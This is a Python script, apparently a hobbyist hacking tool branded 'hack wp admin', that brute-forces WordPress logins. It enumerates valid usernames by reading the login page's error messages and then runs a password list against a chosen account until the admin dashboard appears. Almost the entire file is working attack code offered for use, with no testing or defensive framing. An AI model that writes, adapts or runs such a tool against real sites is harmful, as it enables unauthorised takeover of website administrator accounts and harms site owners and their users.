import os
os.system('clear')
try:
   import requests
except:
   os.system('pip install requests')
   os.system('clear')
try:
   import pyfiglet
except:
   os.system('pip install pyfiglet')
   os.system('clear')
a = pyfiglet.figlet_format("hack wp admin",font= "5lineoblique")
class color():
    def __init__(self,gl,blu,read):
        self.gl = gl
        self.blu = blu
        self.read = read

cl = color('\033[1;32;50m','\033[1;34;50m','\033[1;31;50m')
user = []
def author():
    print(cl.gl,"author  : kwee thite")
    print("youtube : https://youtube.com/channel/UCcnXs2Qm8ehaxcbL50YqAng")
    print("1 :brute user")
    print("2 :brute pass")
    print("3 :exit")
    inp = input("Enter Option :")
    if inp =='1':
       inp = input("enter Url :")
       bf_user(inp)
    if inp =='2':
       inp = input("enter Url :")
       bf_pass(inp)

def bf_user(url):
    user_list = open('user.txt','r')
    cookie =""    
    for i in user_list:
          data = {'log':f"{i}",'pwd':'a'}
          while True:
                ru = requests.post(url,data=data,cookies=cookie)
                cookie = ru.cookies 
                if 'Username or Email Address' in ru.text or 'is incorrect' in ru.text: 
                            break
          if 'is incorrect' in ru.text:
             print(f"##FOUND USER NAME :{i}")
             user.append(i)
          else:
             print(f"#invalid user :{i}")
    print(f"total user in list:{len(user)}")
    print(user)
    print("###############################################")
    print("################################################")

    author()
def bf_pass(url):
    cookie = ""
    pass_list = open('pass.txt','r')
    user_name = input("username for admin :")
    for i in pass_list:
          data = {'log':f"{user_name}",'pwd':f"{i}"}
          while True:
             ru = requests.post(url,data=data,cookies=cookie)
             cookie = ru.cookies
             if 'Username or Email Address' in ru.text or 'Dashboard' in ru.text:
                          break
          if 'is incorrect' in ru.text:
             print(f"#invalid pass :{i}")
          if 'Unknown username' in ru.text:
              print("user name is invalid first you need to find username in option1")
              break
          if 'Dashboard' in ru.text:
             print(f"##FOUND pass :{i}")
             break
    
print(cl.read,a)
author()

